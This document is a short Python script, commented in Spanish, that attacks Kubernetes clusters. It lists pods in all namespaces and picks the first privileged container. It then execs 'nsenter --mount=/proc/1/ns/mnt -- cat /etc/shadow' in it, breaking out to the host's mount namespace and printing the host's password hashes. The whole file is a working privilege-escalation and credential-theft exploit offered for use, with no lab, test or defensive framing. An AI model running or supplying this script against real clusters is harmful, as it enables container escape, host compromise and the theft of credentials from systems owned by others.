from kubernetes import client, config
import subprocess

def kubernetes_privilege_escalation():
    try:
        # Cargar configuración de Kubernetes
        config.load_kube_config()
        
        v1 = client.CoreV1Api()
        
        # Listar pods
        pods = v1.list_pod_for_all_namespaces().items
        print(f"[+] Encontrados {len(pods)} pods")
        
        # Buscar pods con privilegios
        privileged_pods = []
        for pod in pods:
            for container in pod.spec.containers:
                if container.security_context and container.security_context.privileged:
                    privileged_pods.append(pod)
        
        print(f"[+] Encontrados {len(privileged_pods)} pods privilegiados")
        
        # Explotar pod privilegiado
        if privileged_pods:
            target_pod = privileged_pods[0]
            print(f"[+] Explotando pod: {target_pod.metadata.name}")
            
            # Ejecutar comando en el pod
            exec_command = ['/bin/sh', '-c', 'nsenter --mount=/proc/1/ns/mnt -- cat /etc/shadow']
            
            resp = v1.connect_get_namespaced_pod_exec(
                target_pod.metadata.name,
                target_pod.metadata.namespace,
                command=exec_command,
                stderr=True, stdin=False,
                stdout=True, tty=False
            )
            
            print("[+] Contenido de /etc/shadow:")
            print(resp)
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    kubernetes_privilege_escalation()